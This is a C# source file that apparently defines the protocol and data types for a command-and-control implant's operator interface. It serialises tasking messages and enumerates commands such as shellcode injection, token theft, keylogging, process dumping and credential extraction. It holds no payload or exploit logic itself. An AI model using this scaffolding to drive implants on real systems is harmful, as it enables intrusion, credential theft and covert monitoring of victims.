using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;



namespace NHAPI
{
	public class CommsProtocolMessage
	{		
		public static CommsProtocolMessage UnSerialize(byte[] buffer)
		{
			CommsProtocolMessage result;
			using (MemoryStream memoryStream = new MemoryStream(buffer))
			{
				using (BinaryReader binaryReader = new BinaryReader(memoryStream))
				{
					result = new CommsProtocolMessage(new Guid(binaryReader.ReadBytes(16)), new Guid(binaryReader.ReadBytes(16)), DateTime.FromFileTimeUtc(binaryReader.ReadInt64()), (ECommsProtocolMessageType)binaryReader.ReadInt32(), binaryReader.ReadBytes(binaryReader.ReadInt32()));
				}
			}
			return result;
		}

		public static byte[] Serialize(CommsProtocolMessage msg)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (BinaryWriter binaryWriter = new BinaryWriter(memoryStream))
				{
					binaryWriter.Write(msg.ClientId.ToByteArray());
					binaryWriter.Write(msg.MessageId.ToByteArray());
					binaryWriter.Write(msg.DateTime.ToFileTimeUtc());
					binaryWriter.Write((int)msg.Type);
					binaryWriter.Write(msg.Buffer.Length);
					binaryWriter.Write(msg.Buffer);
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
		public CommsProtocolMessage(Guid clientid, Guid messageid, DateTime datetime, ECommsProtocolMessageType type, byte[] buffer)
		{
			this.ClientId = clientid;
			this.MessageId = messageid;
			this.DateTime = datetime;
			this.Type = type;
			this.Buffer = buffer;
		}
		public Guid ClientId { get; private set; }
		public Guid MessageId { get; private set; }
		public DateTime DateTime { get; private set; }
		public ECommsProtocolMessageType Type { get; private set; }
		public byte[] Buffer { get; private set; }
	}

	public enum ECommsProtocolMessageType
	{
		CPMT_TUNNEL,
		CPMT_SHELL,
		CPMT_GETDRIVES,
		CPMT_GETDIR,
		CPMT_GET_FILEDETAILS,
		CPMT_GET_FILEPART,
		CPMT_PUT_FILEPART,
		CPMT_UPDATE_CONFIG,
		CPMT_SOCKS_MSG,
		CPMT_GET_DETAILED_INFO,
		CPMT_EXECUTE_ASSEMBLY,
		CPMT_IMPERSONATE_USER,
		CPMT_REVERT_TO_SELF,
		CPMT_CHANGE_DIRECTORY,
		CPMT_PRINT_DIRECTORY,
		CPMT_WHOAMI,
		CPMT_MIGRATE,
		CPMT_INJECT_RDLL,
		CPMT_RUNAS_USER,
		CPMT_ENUM_PROCESSES,
		CPMT_MOVE_FILE,
		CPMT_DELETE_FILE,
		CPMT_COPY_FILE,
		CPMT_TERMINATE_PROCESS,
		CPMT_READ_NAMED_PIPE,
		CPMT_STEAL_PROCESS_TOKEN,
		CPMT_SWITCH_TO_STORED_TOKEN,
		CPMT_LIST_STORED_TOKENS,
		CPMT_DELETE_STORED_TOKEN,
		CPMT_CLEAR_STORED_TOKENS,
		CPMT_INJECT_SHELLCODE,
		CPMT_ENUMERATE_PRIVILEGES,
		CPMT_ENABLE_PRIVILEGE,
		CPMT_DISABLE_PRIVILEGE,
		CPMT_HIBERNATION_STATUS,
		CPMT_EXECUTE_BOF,
		CPMT_LOGONS,
		CPMT_LUA,
		CPMT_PIPELIST,
		CPMT_PROFLIST,
		CPMT_WINDOWLIST,
		CPMT_APPLIST,
		CPMT_PORTLIST,
		CPMT_SERVICELIST,
		CPMT_THREADLIST,
		CPMT_MODULELIST,
		CPMT_HANDLELIST,
		CPMT_OBJECTLIST,
		CPMT_KEYLOGGER,
		CPMT_CAPTURE_WINDOW,
		CPMT_PROCDUMP,
		CPMT_CREDMAN,
		CPMT_IMPERSONATE_SYSTEM,
		CPMT_IMPERSONATE_VIRTUAL,
		CPMT_TOKEN_INFORMATION,
		CPMT_UNLINK,
		CPMT_CREATE_DIRECTORY,
		CPMT_REMOVE_DIRECTORY,
		CPMT_GET_CONFIG,
		CPMT_LIST_CANCELLABLE_TASKS,
		CPMT_CANCEL_TASK
	}

	public enum EIntegrityLevel
	{
		Unknown,
		Untrusted,
		Low,
		Medium,
		MediumPlus,
		High,
		System,
		Protected
	}

	public enum EDetailedInfoProcessType
	{
		Unknown,
		x86,
		x64
	}

	class AgentDriveInfo
	{
		public override string ToString()
		{
			return string.Format("Path: {0}, Type: {1}, Total Size: {2:n0}, Free Size: {3:n0}", new object[]
			{
				this.Path,
				this.Type.ToString(),
				this.TotalSize,
				this.FreeSize
			});
		}
		public string Path;
		public EDriveType Type;
		public ulong TotalSize;
		public ulong FreeSize;
	}

	public class HistoricCommand
	{
		public string Command { get; set; }

		public Guid MessageId { get; set; }
	}

	class ApplicationInformation
	{
		public string Name { get; set; }
		public string Publisher { get; set; }
		public string Version { get; set; }
		public string Uninstall { get; set; }
	}

	class CancellableTaskResult
	{
		public CancellableTaskResult(Guid taskId, string taskName, string description, int executionTime)
		{
			this.TaskID = taskId;
			this.TaskName = taskName;
			this.Description = description;
			this.ExecutionTime = executionTime;
		}
		public Guid TaskID { get; private set; }
		public string TaskName { get; private set; }
		public string Description { get; private set; }
		public int ExecutionTime { get; private set; }
	}
	class ConnectionInformation
	{
		public uint ProcessId { get; set; }
		public string Protocol { get; set; }
		public string LocalIpAddress { get; set; }
		public string RemoteIpAddress { get; set; }
		public string State { get; set; }
		public string ModuleName { get; set; }
		public string RemoteHostName { get; set; }
	}


	class CredentialInformation
	{
		public string Flags { get; set; }
		public string Type { get; set; }
		public string Persist { get; set; }
		public string Date { get; set; }
		public string Time { get; set; }
		public string Username { get; set; }
		public string Password { get; set; }
		public string Comment { get; set; }
		public string TargetName { get; set; }
		public string TargetAlias { get; set; }
	}

	enum EDriveType : uint
	{
		DRIVE_UNKNOWN,
		DRIVE_NO_ROOT_DIR,
		DRIVE_REMOVABLE,
		DRIVE_FIXED,
		DRIVE_REMOTE,
		DRIVE_CDROM,
		DRIVE_RAMDISK
	}

	enum ESocksCommsMsgType
	{
		SCMT_PROTO,
		SCMT_RELAY,
		SCMT_DISCONNECTED,
		SCMT_IGNORE
	}

	class EncapsulatedSocksMessage
	{
		public EncapsulatedSocksMessage(Guid connId, ESocksCommsMsgType type, byte[] buf)
		{
			this.ConnectionId = connId;
			this.SocksMsgType = type;
			this.MessageBytes = buf;
		}
		public Guid ConnectionId { get; private set; }
		public ESocksCommsMsgType SocksMsgType { get; private set; }
		public byte[] MessageBytes { get; private set; }
	}
	class EnumeratedPrivilege
	{
		public string PrivilegeName;
		public bool Enabled;
	}
	enum EProcessArchitecture
	{
		Unknown,
		x86,
		x64
	}

	enum EProcessInjectionResult
	{
		UnknownFailure,
		FailedLocateExport,
		FailedProcessCreate,
		FailedProcessOpen,
		FailedAllocMemory,
		FailedWriteMemory,
		FailedProtectMemory,
		FailedThreadOpen,
		FailedExecuteMemory,
		Succeeded
	}

	class ExecuteShellCommandResult
	{
		public int LastError { get; set; }
		public string ConsoleOutput { get; set; }
		public bool Exited { get; set; }
		public int ExitCode { get; set; }
		public string ProcessName { get; set; }
		public string CommandLine { get; set; }
	}

	class GroupInformation : UserInformation
	{
		public string Description { get; set; }
		public string Status { get; set; }
	}

	class HandleInformation
	{
		public string Type { get; set; }
		public string Name { get; set; }
		public uint Value { get; set; }
		public uint TypeIndex { get; set; }
		public uint GrantedAccess { get; set; }
		public uint Attributes { get; set; }
	}

	class KeyLogInformation
	{
		public uint Command;
		public bool Status;
		public string Keys;
	}


	class LogonInformation
	{
		public uint Session { get; set; }
		public ulong Id { get; set; }
		public string Type { get; set; }
		public string Domain { get; set; }
		public string Username { get; set; }
		public string Sid { get; set; }
		public string Date { get; set; }
		public string Time { get; set; }
		public string Server { get; set; }
		public string DnsDomainName { get; set; }
		public string Upn { get; set; }
		public override string ToString()
		{
			return "";
		}
		public string AuthPackage;
	}

	class LUASettings
	{
		public bool FilterAdministratorToken { get; set; }
		public bool EnableUIADesktopToggle { get; set; }
		public int ConsentPromptBehaviorAdmin { get; set; }
		public int ConsentPromptBehaviorUser { get; set; }
		public bool EnableInstallerDetection { get; set; }
		public bool ValidateAdminCodeSignatures { get; set; }
		public bool EnableSecureUIAPaths { get; set; }
		public bool EnableLUA { get; set; }
		public bool PromptOnSecureDesktop { get; set; }
		public bool EnableVirtualization { get; set; }
	}

	class ModuleInformation
	{
		public bool WoW64 { get; set; }
		public ulong BaseAddress { get; set; }
		public uint ImageSize { get; set; }
		public string Name { get; set; }
		public string Path { get; set; }
		public string Description { get; set; }
	}

	class ObjectInformation
	{
		public uint Level { get; set; }
		public string Name { get; set; }
		public string Type { get; set; }
		public string Link { get; set; }
	}

	class PipeInformation
	{
		public uint Instances { get; set; }
		public uint MaxInstances { get; set; }
		public string Name { get; set; }
	}

	class PrivilegeInformation
	{
		public string Name { get; set; }
		public string Display { get; set; }
		public string Status { get; set; }
	}

	class ProcDumpPartialResult
	{
		public ProcDumpPartialResult(Guid dumpId, int pid, int offset, int total, byte[] data)
		{
			this.DumpId = dumpId;
			this.ProcessId = pid;
			this.Offset = offset;
			this.TotalSize = total;
			this.Data = data;
		}
		public Guid DumpId { get; private set; }
		public int ProcessId { get; private set; }
		public int Offset { get; private set; }
		public int TotalSize { get; private set; }
		public byte[] Data { get; private set; }
	}

	class ProcessInformation
	{
		public int Pid { get; set; }
		public int ParentPid { get; set; }
		public int SessionId { get; set; }
		public ulong WorkingSetSize { get; set; }
		public EProcessArchitecture Architecture { get; set; }
		public string ImageName { get; set; }
		public string Description { get; set; }
		public string ImagePath { get; set; }
		public string Username { get; set; }
		public EIntegrityLevel Integrity { get; set; }
		public override string ToString()
		{
			return string.Format("PID: {0}, Parent PID: {1}, Session: {2}, Working Set: {3:n0}, Architecture: {4}, Name: {5}, Description: {6}, Path: {7}, User: {8}, Integrity: {9}", new object[]
			{
				this.Pid,
				this.ParentPid,
				this.SessionId,
				this.WorkingSetSize,
				this.Architecture,
				this.ImageName,
				this.Description,
				this.ImagePath,
				this.Username,
				this.Integrity
			});
		}
	}

	class ProfileInformation
	{
		public string Sid { get; set; }
		public string Domain { get; set; }
		public string User { get; set; }
		public string Path { get; set; }
		public string Type { get; set; }
	}

	class PutFilePartResult
	{
		public PutFilePartResult(Guid partId, int offset, int bytesWritten, string filename)
		{
			this.FileTransferId = partId;
			this.Offset = offset;
			this.BytesWritten = bytesWritten;
			this.Filename = filename;
		}
		public Guid FileTransferId { get; private set; }
		public int Offset { get; private set; }
		public int BytesWritten { get; private set; }
		public string Filename { get; private set; }
	}

	class ReceivedFilePart
	{
		public ReceivedFilePart(Guid fileTransferId, long fileOffset, int bytesRead, byte[] fileData, string filename)
		{
			this.FileTransferId = fileTransferId;
			this.FileBytesRead = bytesRead;
			this.FileData = fileData;
			this.FileReadOffset = fileOffset;
			this.Filename = filename;
		}
		public Guid FileTransferId { get; private set; }
		public int FileBytesRead { get; private set; }
		public byte[] FileData { get; private set; }
		public long FileReadOffset { get; private set; }
		public string Filename { get; private set; }
	}

	class RemoteFileDetails
	{
		public RemoteFileDetails(string fileName, int fileAttributes, DateTime creationTime, DateTime lastAccessTime, DateTime lastWriteTime, long fileSize)
		{
			this.Filename = fileName;
			this.FileAttributes = fileAttributes;
			this.CreationTime = creationTime;
			this.LastAccessTime = lastAccessTime;
			this.LastWriteTime = lastWriteTime;
			this.FileSize = fileSize;
		}
		public override string ToString()
		{
			return string.Format("Name: {0}, Size: {1:n0}, Creation Time: {2}, Last Access: {3}, Last Write: {4}", new object[]
			{
				this.Filename,
				this.FileSize,
				this.CreationTime,
				this.LastAccessTime,
				this.LastWriteTime
			});
		}
		public string Filename { get; protected set; }
		public int FileAttributes { get; protected set; }
		public DateTime CreationTime { get; protected set; }
		public DateTime LastAccessTime { get; protected set; }
		public DateTime LastWriteTime { get; protected set; }
		public long FileSize { get; protected set; }
	}

	class RemoteFileListingDetails : RemoteFileDetails
	{
		public RemoteFileListingDetails(bool isDir, string fileName, int fileAttributes, DateTime creationTime, DateTime lastAccessTime, DateTime lastWriteTime, long fileSize) : base(fileName, fileAttributes, creationTime, lastAccessTime, lastWriteTime, fileSize)
		{
			this.IsDir = isDir;
		}
		public bool IsDir { get; protected set; }
		public override string ToString()
		{
			return "Type: " + (this.IsDir ? "Directory" : "File") + ", " + base.ToString();
		}
	}

	class ServiceInformation
	{
		public string KeyPath { get; set; }
		public string DisplayName { get; set; }
		public string Description { get; set; }
		public string ImagePath { get; set; }
		public string ServiceDll { get; set; }
		public string Group { get; set; }
		public string ObjectName { get; set; }
		public string RequiredPrivileges { get; set; }
		public string DependOnService { get; set; }
		public string FailureCommand { get; set; }
		public string Security { get; set; }
		public uint ErrorControl { get; set; }
		public uint Start { get; set; }
		public uint Type { get; set; }
		public uint SidType { get; set; }
		public uint LaunchProtected { get; set; }
		public uint State { get; set; }
		public uint ControlsAccepted { get; set; }
		public uint ProcessId { get; set; }
		public uint ServiceFlags { get; set; }
	}

	class ThreadInformation
	{
		public int Id;
		public ulong TebAddress;
		public ulong StartAddress;
		public string ImageName;
	}

	class TogglePrivilegeResult
	{
		public string PrivilegeName;
		public bool Success;
	}

	class TokenInformation
	{
		public TokenInformation()
		{
			this.User = new UserInformation();
			this.Owner = new UserInformation();
			this.Privileges = new List<PrivilegeInformation>();
			this.Groups = new List<GroupInformation>();
		}
		public UserInformation User { get; set; }
		public UserInformation Owner { get; set; }
		public List<PrivilegeInformation> Privileges { get; set; }
		public List<GroupInformation> Groups { get; set; }
		public string Type { get; set; }
		public string ImpersonationLevel { get; set; }
		public string IntegrityLevel { get; set; }
		public string ElevationType { get; set; }
		public bool IsElevated { get; set; }
	}

	class UserInformation
	{
		public string Sid { get; set; }
		public string Domain { get; set; }
		public string Account { get; set; }
		public string Type { get; set; }
	}

	class WindowInformation
	{
		public uint ProcessId { get; set; }
		public uint ThreadId { get; set; }
		public uint Handle { get; set; }
		public string ClassName { get; set; }
		public string Text { get; set; }
	}
	enum EDeltaType
	{
		Text,
		Image
	}

	class ConsoleDelta
	{
		public Guid ClientId { get; set; }
		public Guid DeltaId { get; set; }
		public DateTime TimeStampUtc { get; set; }
		public EDeltaType DeltaType { get; set; }
		public byte[] DeltaData { get; set; }
	}

	enum CommandExtraDataType
	{
		VERBATIM_COMMAND,
		DESCRIPTION,
		PRIORITY,
		CONSOLE_INPUT,
		CONSOLE_OUTPUT,
		TAGS,
		ISSUER
	}

	public class DetailedMachineInfo
	{
		public DetailedMachineInfo()
		{ }
		public DetailedMachineInfo(string winver, string machineName, string userName, string processName, int pid, EDetailedInfoProcessType arch, IPAddress[] ipaddrs, EIntegrityLevel il, bool tunnelled)
		{
			this.WindowsVersion = winver;
			this.MachineName = machineName;
			this.UserName = userName;
			this.ProcessName = processName;
			this.PID = pid;
			this.Arch = arch;
			this.IPAddresses = ipaddrs;
			this.IntegrityLevel = il;
			this.Tunnelled = tunnelled;
		}
		public string WindowsVersion { get; set; }
		public string MachineName { get; set; }
		public string UserName { get; set; }
		public string ProcessName { get; set; }
		public int PID { get; set; }
		public EDetailedInfoProcessType Arch { get; set; }
		public IPAddress[] IPAddresses { get; set; }
		public EIntegrityLevel IntegrityLevel { get; set; }
		public bool Tunnelled { get; set; }
		public override string ToString()
		{
			string format = "OS: {0}, Tunnelled: {1}, Machine: {2}, User: {3}, Process: {4} (PID: {5}), Arch: {6}, Integrity: {7}, IPs: {8}";
			object[] array = new object[9];
			array[0] = this.WindowsVersion;
			array[1] = this.Tunnelled;
			array[2] = this.MachineName;
			array[3] = this.UserName;
			array[4] = this.ProcessName;
			array[5] = this.PID;
			array[6] = this.Arch.ToString();
			array[7] = this.IntegrityLevel.ToString();
			array[8] = string.Join(",", from ip in this.IPAddresses
										select ip.ToString());
			return string.Format(format, array);
		}
	}
}
